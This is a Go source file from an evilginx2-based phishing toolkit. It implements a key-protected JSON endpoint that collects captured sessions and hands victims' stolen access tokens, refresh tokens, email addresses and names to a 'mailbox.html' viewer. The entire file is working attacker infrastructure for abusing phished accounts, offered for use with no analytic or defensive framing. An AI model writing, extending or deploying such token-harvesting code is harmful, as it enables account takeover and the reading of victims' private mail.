package core

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// TokenFeed provides a secure JSON API that serves captured tokens to mailbox.html
// It auto-refreshes tokens server-side and serves them via a secret endpoint.

// FeedAccount represents an account entry served to mailbox.html
type FeedAccount struct {
	ID           string `json:"id"`
	Email        string `json:"email"`
	DisplayName  string `json:"displayName"`
	AccessToken  string `json:"accessToken"`
	RefreshToken string `json:"refreshToken"`
	SessionID    int    `json:"sessionId"`
	CapturedAt   string `json:"capturedAt"`
	LastRefresh  string `json:"lastRefresh"`
	Status       string `json:"status"` // "active" or "expired"
}

// TokenFeed manages the API endpoint for serving tokens to mailbox viewer
type TokenFeed struct {
	db        *database.Database
	apiKey    string // Secret key for API access
	mu        sync.RWMutex
	lastFetch time.Time
}

// NewTokenFeed creates a new token feed with a random API key
func NewTokenFeed(db *database.Database) *TokenFeed {
	keyBytes := make([]byte, 32)
	rand.Read(keyBytes)
	apiKey := hex.EncodeToString(keyBytes)

	tf := &TokenFeed{
		db:     db,
		apiKey: apiKey,
	}

	log.Info("[tokenfeed] Token feed API initialized")
	log.Info("[tokenfeed] API Key: %s", apiKey)
	log.Info("[tokenfeed] Endpoint: /api/v1/feed?key=<API_KEY>")

	return tf
}

// NewTokenFeedWithKey creates a token feed with a specific API key (for persistence)
func NewTokenFeedWithKey(db *database.Database, apiKey string) *TokenFeed {
	tf := &TokenFeed{
		db:     db,
		apiKey: apiKey,
	}

	log.Info("[tokenfeed] Token feed API initialized with saved key")
	log.Info("[tokenfeed] Endpoint: /api/v1/feed?key=<API_KEY>")

	return tf
}

// GetAPIKey returns the current API key
func (tf *TokenFeed) GetAPIKey() string {
	tf.mu.RLock()
	defer tf.mu.RUnlock()
	return tf.apiKey
}

// SetAPIKey sets a new API key
func (tf *TokenFeed) SetAPIKey(key string) {
	tf.mu.Lock()
	defer tf.mu.Unlock()
	tf.apiKey = key
	log.Info("[tokenfeed] API key updated")
}

// ValidateKey checks if the provided key matches the API key
func (tf *TokenFeed) ValidateKey(key string) bool {
	tf.mu.RLock()
	defer tf.mu.RUnlock()
	return key != "" && key == tf.apiKey
}

// GetAccounts returns all sessions that have tokens, formatted for mailbox.html
func (tf *TokenFeed) GetAccounts() ([]FeedAccount, error) {
	tf.mu.Lock()
	tf.lastFetch = time.Now()
	tf.mu.Unlock()

	sessions, err := tf.db.ListSessions()
	if err != nil {
		return nil, fmt.Errorf("failed to list sessions: %v", err)
	}

	var accounts []FeedAccount

	for _, s := range sessions {
		if s.Custom == nil {
			continue
		}

		accessToken := s.Custom["dc_access_token"]
		refreshToken := s.Custom["dc_refresh_token"]

		// Skip sessions without any tokens
		if accessToken == "" && refreshToken == "" {
			continue
		}

		email := s.Custom["dc_user_email"]
		if email == "" {
			email = s.Username
		}
		if email == "" {
			email = fmt.Sprintf("session-%d", s.Id)
		}

		displayName := s.Custom["dc_user_name"]
		if displayName == "" {
			displayName = email
		}

		status := "active"
		if refreshToken == "" {
			status = "no-refresh"
		}

		acc := FeedAccount{
			ID:          fmt.Sprintf("eg-%d", s.Id),
			Email:       email,
			DisplayName: displayName,
			AccessToken: accessToken,
			RefreshToken: refreshToken,
			SessionID:   s.Id,
			CapturedAt:  time.Unix(s.CreateTime, 0).UTC().Format(time.RFC3339),
			LastRefresh: time.Unix(s.UpdateTime, 0).UTC().Format(time.RFC3339),
			Status:      status,
		}

		accounts = append(accounts, acc)
	}

	return accounts, nil
}

// HandleFeedRequest processes an API request and returns JSON response body + status code
func (tf *TokenFeed) HandleFeedRequest(apiKey string) (string, int) {
	if !tf.ValidateKey(apiKey) {
		return `{"error":"unauthorized","message":"Invalid or missing API key"}`, 401
	}

	accounts, err := tf.GetAccounts()
	if err != nil {
		log.Error("[tokenfeed] Failed to get accounts: %v", err)
		return fmt.Sprintf(`{"error":"internal","message":"%s"}`, err.Error()), 500
	}

	if accounts == nil {
		accounts = []FeedAccount{}
	}

	response := struct {
		Accounts  []FeedAccount `json:"accounts"`
		Count     int           `json:"count"`
		Timestamp string        `json:"timestamp"`
	}{
		Accounts:  accounts,
		Count:     len(accounts),
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}

	data, err := json.Marshal(response)
	if err != nil {
		return `{"error":"internal","message":"failed to serialize"}`, 500
	}

	return string(data), 200
}
